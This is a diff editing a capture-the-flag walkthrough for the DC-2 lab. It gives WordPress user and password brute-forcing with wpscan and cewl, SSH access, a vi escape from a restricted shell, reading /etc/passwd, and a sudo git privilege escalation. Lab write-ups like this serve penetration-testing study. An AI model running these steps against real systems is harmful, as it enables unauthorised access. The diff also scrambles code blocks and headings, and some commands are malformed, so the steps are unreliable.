@@ -4,7 +4,8 @@
 
 ```sh
 gedit /etc/hosts
-http://dc-2
+ip    dc-2
+>>webbrowser >> http://dc-2
 ```
 
 ### Flag 1
@@ -16,11 +17,7 @@ http://dc-2
 
 ```sh
 wpscan --url http://dc-2
-```
-
 ### Enumerating Users and Passwords
-
-```sh
 cewl http://dc-2 > /home/pinisher/Testing/Dc-2/passwords.txt
 wpscan --url http://dc-2 -U 'location/users.txt' -P 'location/passwords.txt'
 ```
@@ -32,11 +29,6 @@ wpscan --url http://dc-2 -U 'location/users.txt' -P 'location/passwords.txt'
 
 ```sh
 nikto http://dc-2 >> wp-login.php
-```
-
-### Logging in as Tom
-
-```sh
 simple login to tom
 ```
 
@@ -49,24 +41,13 @@ simple login to tom
 
 ```sh
 nmap -p- -sV <target-ip>
-```
-
 ### Accessing SSH
-
-```sh
 ssh tom@<target-ip> -p 7744
 ls /usr/bin
-```
-
 ### Privilege Escalation
-
-```sh
 vi
 :set shell=/bin/bash
 :shell
-```
-
-```sh
 echo $PATH
 export PATH=$PATH:/home/tom/usr/bin:/bin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin
 cd /usr/local
@@ -74,16 +55,10 @@ ls
 ```
 
 ### Flag 3
-
+> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
 ```sh
 tom@DC-2:$ echo $(<flag3.txt)
-```
-
-> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
-
 ### Checking /etc/passwd
-
-```sh
 cat /etc/passwd
 ```
 
@@ -92,9 +67,10 @@ tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash
 jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash
 ```
 
-### Switching to Jerry
+
 
 ```sh
+### Switching to Jerry
 su jerry
 # Enter password
 ```
@@ -114,10 +90,9 @@ sudo git branch --help config
 cd root
 ```
 
-## Final Flag
+### Final Flag
 
 **Congratulations!!!**
 
-> [https://gtfobins.github.io/gtfobins/git/#sudo](https://gtfobins.github.io/gtfobins/git/#sudo)
 > A special thanks to all those who sent me tweets and provided me with feedback - it's all greatly appreciated.
 
